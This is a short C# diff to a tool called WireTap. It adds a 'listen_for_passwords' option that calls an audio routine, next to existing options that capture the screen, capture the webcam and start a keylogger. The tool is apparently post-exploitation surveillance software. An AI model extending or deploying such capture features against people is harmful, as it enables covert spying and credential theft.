@@ -13,6 +13,7 @@ namespace WireTap
             bool captureScreen = false;
             bool captureWebCam = false;
             bool captureKeyStrokes = false;
+            bool listenPassword = false;
 
             if (args.Length == 0 || args.Length > 2)
             {
@@ -38,6 +39,9 @@ namespace WireTap
                     break;
                 case "capture_keystrokes":
                     captureKeyStrokes = true;
+                    break;
+                case "listen_for_passwords":
+                    listenPassword = true;
                     break;
                 default:
                     Helpers.Usage();
@@ -90,6 +94,10 @@ namespace WireTap
             else if (captureKeyStrokes)
             {
                 Keyboard.StartKeylogger();
+            }
+            else if (listenPassword)
+            {
+                Audio.ListenForPasswords();
             }
         }
     }
